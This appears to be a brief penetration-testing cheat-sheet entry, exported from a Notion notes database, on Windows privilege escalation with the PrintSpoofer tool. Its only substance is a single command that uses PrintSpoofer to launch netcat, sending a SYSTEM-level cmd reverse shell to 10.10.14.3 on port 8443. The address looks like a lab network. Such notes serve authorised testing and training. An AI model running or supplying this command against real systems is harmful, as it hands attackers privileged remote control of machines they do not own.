# PrintSpoofer Example

OS: Windows
Description: Escalate Privileges with PrintSpoofer
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```